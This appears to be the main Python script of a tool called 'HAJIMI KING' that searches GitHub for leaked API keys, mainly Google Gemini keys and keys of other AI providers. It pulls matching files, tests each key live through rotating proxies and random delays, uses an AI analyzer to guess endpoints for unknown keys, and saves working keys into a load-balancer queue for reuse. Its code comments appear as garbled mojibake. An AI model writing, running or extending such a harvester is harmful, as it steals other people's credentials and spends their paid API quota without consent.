import os
import random
import re
import sys
import time
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# åˆ›å»ºGitHubå·¥å…·å®ä¾‹å’Œæ–‡ä»¶ç®¡ç†å™¨
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# ç»Ÿè®¡ä¿¡æ¯
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}


def normalize_query(query: str) -> str:
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    """
    æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡å¤„ç†æ­¤item
    
    Returns:
        tuple: (should_skip, reason)
    """
    # æ£€æŸ¥å¢é‡æ‰«ææ—¶é—´
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception as e:
            pass

    # æ£€æŸ¥SHAæ˜¯å¦å·²æ‰«æ
    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # æ£€æŸ¥ä»“åº“å¹´é¾„
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # æ£€æŸ¥æ–‡æ¡£å’Œç¤ºä¾‹æ–‡ä»¶
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    """
    å¤„ç†å•ä¸ªGitHubæœç´¢ç»“æœitem
    
    Returns:
        tuple: (valid_keys_count, rate_limited_keys_count)
    """
    delay = random.uniform(1, 5)
    file_url = item["html_url"]

    # ç®€åŒ–æ—¥å¿—è¾“å‡ºï¼Œåªæ˜¾ç¤ºå…³é”®ä¿¡æ¯
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"âš ï¸ Failed to fetch content for file: {file_url}")
        return 0, 0

    # ä½¿ç”¨åŸºäºé…ç½®çš„å¤šä¾›åº”å•†å¯†é’¥æå–
    from app.providers.config_key_extractor import config_key_extractor
    all_keys = config_key_extractor.extract_all_keys(content)

    if not all_keys:
        return 0, 0

    total_valid_keys = 0
    total_rate_limited_keys = 0
    all_checked_keys = []  # æ”¶é›†æ‰€æœ‰å·²ç»æ£€æŸ¥è¿‡çš„å¯†é’¥

    # å¤„ç†æ¯ä¸ªä¾›åº”å•†çš„å¯†é’¥
    for provider_name, keys in all_keys.items():
        if not keys:
            continue

        logger.info(f"ğŸ”‘ Found {len(keys)} {provider_name} suspected key(s), validating...")

        # è¿‡æ»¤å ä½ç¬¦å¯†é’¥
        filtered_keys = []
        for key in keys:
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
            filtered_keys.append(key)
        
        # å»é‡å¤„ç†
        keys = list(set(filtered_keys))

        if not keys:
            continue

        valid_keys = []
        rate_limited_keys = []

        # è·å–ä¾›åº”å•†å®ä¾‹å¹¶éªŒè¯å¯†é’¥
        try:
            from app.providers.config_based_factory import ConfigBasedAIProviderFactory
            provider = ConfigBasedAIProviderFactory.get_provider_by_name(provider_name)
            
            if not provider:
                logger.warning(f"âŒ Provider {provider_name} not found in configuration")
                continue
            
            for key in keys:
                validation_result = provider.validate_key(key)
                if validation_result and "ok" in validation_result:
                    valid_keys.append(key)
                    logger.info(f"âœ… VALID {provider_name.upper()}: {key}")
                elif "rate_limited" in validation_result:
                    rate_limited_keys.append(key)
                    logger.warning(f"âš ï¸ RATE LIMITED {provider_name.upper()}: {key}, result: {validation_result}")
                else:
                    logger.info(f"âŒ INVALID {provider_name.upper()}: {key}, result: {validation_result}")
                    # é¢„è®¾ä¾›åº”å•†éªŒè¯å¤±è´¥ï¼Œå°è¯•AIåˆ†ææå–URLä¿¡æ¯
                    logger.info(f"ğŸ¤– å¯†é’¥ {key[:10]}... é¢„è®¾ä¾›åº”å•†éªŒè¯æ— æ•ˆï¼Œå°è¯•AIæå–URLä¿¡æ¯...")
                    
                    # æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡AIåˆ†æï¼ˆGeminiæˆ–OpenRouteræ ¼å¼çš„å¯†é’¥ï¼‰
                    if _should_skip_ai_analysis(key):
                        logger.info(f"â­ï¸ è·³è¿‡AIåˆ†æï¼šå¯†é’¥ {key[:10]}... ç¬¦åˆå·²çŸ¥æ ¼å¼ï¼ˆGeminiæˆ–OpenRouterï¼‰")
                    else:
                        _analyze_and_validate_key_with_ai(content, repo_name, file_path, file_url, key)
                
                # è®°å½•æ‰€æœ‰æ£€æŸ¥è¿‡çš„å¯†é’¥
                all_checked_keys.append(key)
                    
        except Exception as e:
            logger.error(f"âŒ Error validating {provider_name} keys: {e}")
            continue

        # ä¿å­˜ç»“æœ
        if valid_keys:
            file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys, provider_name)
            logger.info(f"ğŸ’¾ Saved {len(valid_keys)} valid {provider_name} key(s)")
            # æ·»åŠ åˆ°åŒæ­¥é˜Ÿåˆ—ï¼ˆä¸é˜»å¡ä¸»æµç¨‹ï¼‰
            try:
                # è·å–ä¾›åº”å•†çš„GPT Load Groupåç§°
                group_name = config_key_extractor.get_gpt_load_group_name(provider_name)
                sync_utils.add_keys_to_queue(valid_keys, provider_name, group_name)
                logger.info(f"ğŸ“¥ Added {len(valid_keys)} {provider_name} key(s) to sync queues (Group: {group_name})")
            except Exception as e:
                logger.error(f"ğŸ“¥ Error adding {provider_name} keys to sync queues: {e}")

        if rate_limited_keys:
            file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys, provider_name)
            logger.info(f"ğŸ’¾ Saved {len(rate_limited_keys)} rate limited {provider_name} key(s)")

        total_valid_keys += len(valid_keys)
        total_rate_limited_keys += len(rate_limited_keys)

    return total_valid_keys, total_rate_limited_keys


def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(1, 5))

        # è·å–éšæœºä»£ç†é…ç½®
        proxy_config = Config.get_random_proxy()
        
        client_options = {
            "api_endpoint": "generativelanguage.googleapis.com"
        }
        
        # å¦‚æœæœ‰ä»£ç†é…ç½®ï¼Œæ·»åŠ åˆ°client_optionsä¸­
        if proxy_config:
            os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(
            api_key=api_key,
            client_options=client_options,
        )

        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        response = model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        return "not_authorized_key"
    except google_exceptions.TooManyRequests as e:
        return "rate_limited"
    except Exception as e:
        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
            return "rate_limited:429"
        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
            return "disabled"
        else:
            return f"error:{e.__class__.__name__}"


def print_skip_stats():
    """æ‰“å°è·³è¿‡ç»Ÿè®¡ä¿¡æ¯"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"ğŸ“Š Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")


def reset_skip_stats():
    """é‡ç½®è·³è¿‡ç»Ÿè®¡"""
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def main():
    start_time = datetime.now()

    # æ‰“å°ç³»ç»Ÿå¯åŠ¨ä¿¡æ¯
    logger.info("=" * 60)
    logger.info("ğŸš€ HAJIMI KING STARTING")
    logger.info("=" * 60)
    logger.info(f"â° Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # 1. æ£€æŸ¥é…ç½®
    if not Config.check():
        logger.info("âŒ Config check failed. Exiting...")
        sys.exit(1)
    # 2. æ£€æŸ¥æ–‡ä»¶ç®¡ç†å™¨
    if not file_manager.check():
        logger.error("âŒ FileManager check failed. Exiting...")
        sys.exit(1)

    # 2.5. æ˜¾ç¤ºSyncUtilsçŠ¶æ€å’Œé˜Ÿåˆ—ä¿¡æ¯
    if sync_utils.balancer_enabled:
        logger.info("ğŸ”— SyncUtils ready for async key syncing")
        
    # æ˜¾ç¤ºé˜Ÿåˆ—çŠ¶æ€
    balancer_queue_count = len(checkpoint.wait_send_balancer)
    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
    logger.info(f"ğŸ“Š Queue status - Balancer: {balancer_queue_count}, GPT Load: {gpt_load_queue_count}")

    # 3. æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯
    search_queries = file_manager.get_search_queries()
    logger.info("ğŸ“‹ SYSTEM INFORMATION:")
    logger.info(f"ğŸ”‘ GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
    logger.info(f"ğŸ” Search queries: {len(search_queries)} loaded")
    logger.info(f"ğŸ“… Date filter: {Config.DATE_RANGE_DAYS} days")
    if Config.PROXY_LIST:
        logger.info(f"ğŸŒ Proxy: {len(Config.PROXY_LIST)} proxies configured")

    if checkpoint.last_scan_time:
        logger.info(f"ğŸ’¾ Checkpoint found - Incremental scan mode")
        logger.info(f"   Last scan: {checkpoint.last_scan_time}")
        logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
        # ä¸å†æ˜¾ç¤ºå·²å¤„ç†æŸ¥è¯¢çš„æ•°é‡ï¼Œå› ä¸ºæŸ¥è¯¢ä¸ä¼šè¢«è·³è¿‡
        # logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
    else:
        logger.info(f"ğŸ’¾ No checkpoint - Full scan mode")


    logger.info("âœ… System ready - Starting king")
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"ğŸ”„ Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()

            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                # ä¸å†è·³è¿‡å·²å¤„ç†çš„æŸ¥è¯¢ï¼Œä»¥æ”¯æŒæŒç»­è¿è¡Œå’ŒæŒ–æ˜æ–°çš„key
                # if normalized_q in checkpoint.processed_queries:
                #     logger.info(f"ğŸ” Skipping already processed query: [{q}],index:#{i}")
                #     continue

                res = github_utils.search_for_keys(q)

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0

                        for item_index, item in enumerate(items, 1):

                            # æ¯20ä¸ªitemä¿å­˜checkpointå¹¶æ˜¾ç¤ºè¿›åº¦
                            if item_index % 20 == 0:
                                logger.info(
                                    f"ğŸ“ˆ Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | current rate limited: {query_rate_limited_keys} | total valid: {total_keys_found} | total rate limited: {total_rate_limited_keys}")
                                file_manager.save_checkpoint(checkpoint)
                                file_manager.update_dynamic_filenames()

                            # æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡æ­¤item
                            should_skip, skip_reason = should_skip_item(item, checkpoint)
                            if should_skip:
                                logger.info(f"ğŸš« Skipping item,name: {item.get('path','').lower()},index:{item_index} - reason: {skip_reason}")
                                continue

                            # å¤„ç†å•ä¸ªitem
                            valid_count, rate_limited_count = process_item(item)

                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1

                            # è®°å½•å·²æ‰«æçš„SHA
                            checkpoint.add_scanned_sha(item.get("sha"))

                            loop_processed_files += 1



                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys

                        if query_processed > 0:
                            logger.info(f"âœ… Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
                        else:
                            logger.info(f"â­ï¸ Query {i}/{len(search_queries)} complete - All items skipped")

                        print_skip_stats()
                    else:
                        logger.info(f"ğŸ“­ Query {i}/{len(search_queries)} - No items found")
                else:
                    logger.warning(f"âŒ Query {i}/{len(search_queries)} failed")

                # ä¸å†å°†æŸ¥è¯¢æ·»åŠ åˆ°å·²å¤„ç†åˆ—è¡¨ä¸­
                # checkpoint.add_processed_query(normalized_q)
                query_count += 1

                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)
                file_manager.update_dynamic_filenames()

                if query_count % 5 == 0:
                    logger.info(f"â¸ï¸ Processed {query_count} queries, taking a break...")
                    time.sleep(1)

            logger.info(f"ğŸ Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")

            logger.info(f"ğŸ’¤ Sleeping for 10 seconds...")
            time.sleep(10)

        except KeyboardInterrupt:
            logger.info("â›” Interrupted by user")
            checkpoint.update_scan_time()
            file_manager.save_checkpoint(checkpoint)
            logger.info(f"ğŸ“Š Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
            logger.info("ğŸ”š Shutting down sync utils...")
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"ğŸ’¥ Unexpected error: {e}")
            traceback.print_exc()
            logger.info("ğŸ”„ Continuing...")
            continue

def _analyze_and_validate_key_with_ai(content: str, repo_name: str, file_path: str, file_url: str, key: str) -> None:
    """
    ä½¿ç”¨AIåˆ†ææ–‡ä»¶å†…å®¹ï¼Œæå–ç‰¹å®šå¯†é’¥çš„URLå’Œæ¨¡å‹ä¿¡æ¯ï¼Œå¹¶è¿›è¡ŒéªŒè¯
    
    Args:
        content: æ–‡ä»¶å†…å®¹
        repo_name: ä»“åº“åç§°
        file_path: æ–‡ä»¶è·¯å¾„
        file_url: æ–‡ä»¶URL
        key: éœ€è¦åˆ†æçš„APIå¯†é’¥
    """
    try:
        # å¯¼å…¥AIåˆ†æå™¨
        from utils.ai_analyzer import AIAnalyzer
        ai_analyzer = AIAnalyzer()
        
        if not ai_analyzer.enabled:
            logger.info("ğŸ¤– AIåˆ†æåŠŸèƒ½æœªå¯ç”¨ï¼Œè·³è¿‡")
            return
            
        # ä½¿ç”¨AIæå–APIä¿¡æ¯
        api_info = ai_analyzer.extract_api_info(content, file_path, key)
        
        if not api_info or not api_info.get('base_url'):
            logger.info(f"ğŸ¤– AIæ— æ³•æå–å¯†é’¥ {key[:10]}... çš„URLä¿¡æ¯")
            return
            
        base_url = api_info['base_url']
        model = api_info.get('model', 'gpt-3.5-turbo')
        service_type = api_info.get('service_type', 'unknown')
        
        logger.info(f"ğŸ¤– AIæå–åˆ°ä¿¡æ¯: URL={base_url}, Model={model}, Service={service_type}")
        
        # ä½¿ç”¨OpenAIæ ¼å¼éªŒè¯å¯†é’¥
        is_valid, validation_result = ai_analyzer.validate_key_with_openai_format(key, base_url, model)
        
        if is_valid:
            logger.info(f"âœ… AIéªŒè¯æœ‰æ•ˆ: {key[:10]}... (URL: {base_url})")
            # ä¿å­˜AIåˆ†æç»“æœ
            from utils.file_manager import file_manager
            file_manager.save_ai_valid_key(repo_name, file_path, file_url, key, base_url, model, service_type)
        else:
            logger.info(f"âŒ AIéªŒè¯æ— æ•ˆ: {key[:10]}... - {validation_result}")
            
    except Exception as e:
        logger.error(f"âŒ AIåˆ†æå¤„ç†å¤±è´¥: {e}")
        import traceback
        traceback.print_exc()


def _should_skip_ai_analysis(key: str) -> bool:
    """
    æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡AIåˆ†æ
    
    Args:
        key: APIå¯†é’¥
        
    Returns:
        bool: å¦‚æœå¯†é’¥ç¬¦åˆé…ç½®ä¸­çš„æ ¼å¼ï¼Œè¿”å›True
    """
    # ä½¿ç”¨åŸºäºé…ç½®çš„å¯†é’¥æå–å™¨æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡AIåˆ†æ
    from app.providers.key_extractor import KeyExtractor
    return KeyExtractor.should_skip_ai_analysis_by_config(key)


if __name__ == "__main__":
    main()
